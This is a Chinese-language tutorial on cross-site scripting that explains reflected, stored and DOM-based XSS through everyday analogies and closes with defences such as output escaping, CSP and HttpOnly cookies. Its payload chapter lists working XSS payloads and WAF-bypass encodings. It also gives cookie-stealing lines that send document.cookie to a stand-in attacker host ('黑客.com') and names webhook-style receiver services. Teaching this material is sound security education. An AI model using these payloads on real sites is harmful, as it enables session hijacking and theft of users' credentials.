# XSS 

> 核心思想：把代码翻译成人话，理解逻辑而非背语法。

------

## 第一章：什么是 XSS？

**XSS（跨站脚本攻击）** 的本质非常简单：

> **让网站把我输入的“字符串”，当成“可执行的指令”来处理。**

- **正常情况**：你输入 `张三`，网站显示 `欢迎你，张三`。
- **XSS 情况**：你输入 `alert(1)`，网站把它当成代码执行，弹出一个窗口。

**形象比喻**：

就像你对智能音箱说：“播放音乐”。如果黑客能骗过音箱，让它执行“转账”指令，那就是 XSS。

------

## 第二章：XSS 的三大类型

XSS 根据**注入位置**和**触发方式**分为三类。

| 类型       | 存储位置          | 触发方式         | 危害程度 | 生活比喻 |
| ---------- | ----------------- | ---------------- | -------- | -------- |
| **反射型** | 不存储（URL参数） | 诱骗点击链接     | 中       | 钓鱼链接 |
| **存储型** | 服务器（数据库）  | 访问页面自动触发 | **高**   | 污染水源 |
| **DOM 型** | URL（#片段）      | 前端 JS 解析触发 | 中~高    | 前台失误 |

### 1. 反射型 XSS (Reflected)

- **原理**：你把恶意代码藏在 URL 里，网站服务端拿到后**原样返回**给浏览器，浏览器执行。
- **场景**：搜索框、错误提示页。
- **特点**：必须诱导用户点击（如发邮件、发短信）。

### 2. 存储型 XSS (Stored)

- **原理**：恶意代码被提交并保存（如评论、昵称），**所有**查看该内容的用户都会执行代码。
- **场景**：留言板、用户签名、文章发布。
- **特点**：影响范围广，危害最大。

### 3. DOM 型 XSS (DOM-based)

- **原理**：代码不经过服务端，是前端 JS 从 URL 或页面中读取数据，然后**不安全地写入页面**导致的。
- **场景**：通过 URL 的 `#`号传参。
- **特点**：在网页源代码中看不到 Payload，只能在开发者工具的 Elements 面板看到。

### 4.彻底分清三种类型

* 用“点外卖”的例子彻底分清，我们把浏览器看作顾客，把服务器看作后厨。

  * 反射型 XSS（服务员传错话）
    * 场景：你点餐时说：“我要一份宫保鸡丁<script>alert(1)</script>”。
    * 过程：服务员（URL）把你的话传给后厨。后厨（服务端）没过滤，直接把这句话写在了小票上。服务员把小票（HTTP 响应）拿给你看。你看到小票，浏览器执行了 <script>。
    * 关键点：Payload 在 URL 里（你说的话）。服务端参与了（后厨写了小票）。看源码：能在网页源代码里看到 <script>alert(1)</script>。

  * 存储型 XSS（黑心商家留恶评）
    * 场景：一个黑客之前在这家店留言：“菜很难吃 <script>alert(1)</script>”。老板把这条留言存到了台账（数据库）里。
    * 过程：你进店吃饭。服务员（服务端）从台账里取出那条历史留言。服务员把写有恶意代码的菜单（HTTP 响应）给你。你看到菜单，浏览器执行了代码。
    * 关键点：Payload 在数据库里。服务端参与了（从数据库读数据并写到页面）。看源码：能在网页源代码里看到 <script>alert(1)</script>。

  * DOM 型 XSS（服务员自己瞎改单）
    * 场景：你点餐时说：“我要一份#宫保鸡丁”（注意 #号）。
    * 过程：服务员（URL）把 #宫保鸡丁传给后厨。后厨（服务端）不管 #号后面的内容，直接给你一张空白菜单。服务员（前端 JS）拿到菜单后，自己拿起笔，根据 #后面的指示，在菜单上写：“顾客点了 <script>alert(1)</script>”。你看到菜单，浏览器执行了代码。
    * 关键点：Payload 在 URL 的 #后面。服务端没参与（服务端给的是白纸，是 JS 后来画的）。看源码：在网页源代码中绝对找不到 Payload！ 必须在开发者工具的 Elements（元素） 面板里看。

------

## 第三章：关键名词大白话解释

在看 Payload 之前，必须先搞懂这几个词：

### 1. `<script>`：集装箱

- **形状**：`<xxx> ... </xxx>`（成对出现）。
- **作用**：包裹 JavaScript 代码。
- **例子**：`<script>alert(1)</script>`。
- **人话**：**“从这开始，到这结束，中间都是我要执行的指令。”**

### 2. `<img>`：快递单

- **形状**：`<xxx>`（单个出现）。
- **作用**：描述资源本身，靠属性干活。
- **例子**：`<img src="x" onerror="alert(1)">`。
- **人话**：**“我是图片，地址是 x，如果加载失败，就执行 alert(1)。”**

### 3. `src`：下载地址

- **全称**：Source。
- **作用**：告诉浏览器去哪里拿东西（图片、脚本等）。
- **人话**：**“去这个网址把资源拿回来。”**

### 4. `onerror`：出错处理

- **作用**：当 `src`加载失败、图片不存在时触发的指令。
- **人话**：**“事情办砸了，赶紧执行 Plan B。”**

### 5. `fetch`：快递小哥

- **作用**：在后台偷偷把数据发送到另一个网站。
- **人话**：**“把这份机密文件（Cookie）寄到我的老巢。”**

### 6. `document.cookie`：门禁卡

- **作用**：读取浏览器保存的登录凭证。
- **人话**：**“把我的登录钥匙拿出来。”**

------

## 第四章：XSS Payload 全集

### 第一节：通用 Payload（反射型 & 存储型）

#### 1. 基础检测（弹窗）

用于证明漏洞存在。

```
<!-- 标准写法 -->
<script>alert(1)</script>

<!-- 大小写混淆（绕过过滤） -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 利用图片错误（最常用） -->
<img src=x onerror=alert(1)>

<!-- 利用 SVG 加载 -->
<svg onload=alert(1)>

<!-- 利用 body 加载 -->
<body onload=alert(1)>

<!-- 利用输入框焦点（autofocus 自动触发） -->
<input type="text" onfocus=alert(1) autofocus>

<!-- HTML5 新标签 -->
<details open ontoggle=alert(1)>
```

#### 2. 实战攻击（偷 Cookie）

**注意：这类攻击需要一个“接收器”（黑客的服务器）。**

```
<!-- 使用 fetch 发送（推荐） -->
<script>fetch('https://黑客.com?c='+document.cookie)</script>

<!-- 使用跳转发送 -->
<script>location.href='https://黑客.com?c='+document.cookie</script>

<!-- 利用 img 标签（兼容性好） -->
<img src=x onerror="location='https://黑客.com?c='+document.cookie">

<!-- 利用链接伪协议 -->
<a href="javascript:location.href='//黑客.com?c='+document.cookie">点我领奖</a>
```

#### 3. 伪协议（常用于链接）

```
<a href="javascript:alert(1)">点我</a>
<iframe src="javascript:alert(1)"></iframe>
```

### 第二节：DOM 型 XSS 专用 Payload

这类 Payload 通常放在 URL 的 `#`(Hash) 或 `?`(Query) 后面。

假设前端 JS 代码为：`document.getElementById('box').innerHTML = location.hash;`

```
<!-- 直接注入标签 -->
http://example.com/page#<img src=x onerror=alert(1)>

<!-- 注入 SVG -->
http://example.com/page#<svg/onload=alert(document.domain)>

<!-- 闭合标签注入 -->
http://example.com/page?<script>alert(1)</script>
http://example.com/page?'><script>alert(1)</script>
```

### 第三节：按“注入位置”构造 Payload（绕过过滤）

#### 1. 注入点在 HTML 标签之间

*场景：`<div>【这里】</div>`*

```
<script>alert(1)</script>
<svg/onload=alert(1)>
```

#### 2. 注入点在标签属性内

*场景：`<input value="【这里】">`*

```
" onfocus=alert(1) autofocus "
```

> **解析**：先闭合双引号 `"`，然后插入新的事件属性 `onfocus`。

```
' onmouseover='alert(1)
```

> **解析**：闭合单引号 `'`，鼠标移过触发。

#### 3. 注入点在 JS 代码块中

*场景：`<script>var name = "【这里】";</script>`*

```
"; alert(1); //
```

> **解析**：
>
> 1. `"`闭合变量字符串。
> 2. `;`结束当前 JS 语句。
> 3. `alert(1)`插入恶意代码。
> 4. `//`注释掉后面的垃圾代码，防止报错。

#### 4. 注入点在 href/src 中

*场景：`<a href="【这里】">`*

```
javascript:alert(1)
```

### 第四节：高级绕过技巧（WAF 绕过）

当网站有防火墙（WAF）拦截时：

```
<!-- 不使用圆括号（利用反引号） -->
<img src=x onerror=alert`1`>

<!-- 不使用空格（用 / 代替） -->
<img/src=x/onerror=alert(1)>

<!-- HTML 实体编码 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<!-- 对应解码后：<img src=x onerror=alert(1)> -->

<!-- JS 编码 (Eval) -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<!-- 对应解码后：alert(1) -->

<!-- 利用冷门标签 -->
<marquee onstart=alert(1)>XSS</marquee>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

------

## 第五章：为什么需要“接收器”？

**这是一个非常重要的概念。**

- **不需要接收器的情况（弹窗）**：
  - `alert(1)`只是在**你自己的**浏览器上显示内容。
  - 就像对着镜子做鬼脸，只有自己看得见。
  - 用途：验证漏洞是否存在（PoC）。
- **必须需要接收器的情况（偷数据）**：
  - `document.cookie`拿到了你的登录凭证。
  - 黑客必须把这个凭证**传输到自己的电脑**上。
  - **接收器**就是一个专门记录来访信息的网址（如 `https://evil.com/log`）。
  - 就像偷到了门禁卡，必须拿回老巢才能复制使用。
- 接收器
  - https://webhook.site/（推荐）
  - https://pipedream.com/requestbin

------

## 第六章：防御手段（三件套）

1. **输出转义（最核心）**：
   - 在把数据展示到页面时，把 `<`变成 `<`，把 `>`变成 `>`。
   - 这样浏览器就会把代码当成普通文字显示，而不是执行它。
2. **输入验证**：
   - 只允许特定的字符（如手机号只能输数字）。
3. **浏览器策略**：
   - **CSP (Content Security Policy)**：限制浏览器只能加载哪些域名的脚本，禁止内联脚本。
   - **HttpOnly Cookie**：给 Cookie 加一把锁，禁止 JavaScript 读取（即使有 XSS，也偷不走 Cookie）。

------

## 第七章：一句话总结

> **XSS 就是骗浏览器把“文本”当“代码”跑。**
>
> **反射型靠骗点击，存储型靠脏数据，DOM 型靠 JS 瞎搞。**
>
> **`<script>`是集装箱，`<img>`是快递单，`fetch`是寄快递。**

------

